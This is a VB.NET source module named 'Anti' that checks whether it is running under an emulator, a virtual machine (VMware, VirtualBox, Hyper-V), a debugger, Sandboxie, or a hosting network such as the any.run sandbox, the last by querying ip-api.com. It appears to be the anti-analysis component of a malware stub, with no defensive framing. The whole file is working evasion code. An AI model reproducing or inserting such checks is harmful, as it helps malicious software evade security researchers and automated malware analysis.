﻿Imports System.Runtime.InteropServices
Imports System.Management

Module Anti
    Public Function Emulator() As Boolean
        Try
            Dim ticks As Long = DateTime.Now.Ticks
            System.Threading.Thread.Sleep(10)
            If DateTime.Now.Ticks - ticks < 10L Then Return True
        Catch
        End Try

        Return False
    End Function

    Public Function DetectVirtualMachine() As Boolean
        Using searcher = New ManagementObjectSearcher("Select * from Win32_ComputerSystem")

            Using items = searcher.[Get]()

                For Each item In items
                    Dim manufacturer As String = item("Manufacturer").ToString().ToLower()

                    If (manufacturer = "microsoft corporation" AndAlso item("Model").ToString().ToUpperInvariant().Contains("VIRTUAL")) OrElse manufacturer.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then
                        Return True
                    End If
                Next
            End Using
        End Using

        Return False
    End Function

    Public Function DetectDebugger() As Boolean
        Dim isDebuggerPresent As Boolean = False
        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, isDebuggerPresent)
        Return isDebuggerPresent
    End Function

    Public Function DetectSandboxie() As Boolean
        If GetModuleHandle("SbieDll.dll").ToInt32() <> 0 Then
            Return True
        Else
            Return False
        End If
    End Function
    Public Function anyrun() As Boolean
        Try
            Dim status As String = New System.Net.WebClient().DownloadString("http://ip-api.com/line/?fields=hosting")
            Return status.Contains("true")
        Catch
        End Try
        Return False
    End Function

    <DllImport("kernel32.dll")>
    Public Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
    End Function
    <DllImport("kernel32.dll", SetLastError:=True, ExactSpelling:=True)>
    Private Function CheckRemoteDebuggerPresent(ByVal hProcess As IntPtr, ByRef isDebuggerPresent As Boolean) As Boolean
    End Function
End Module
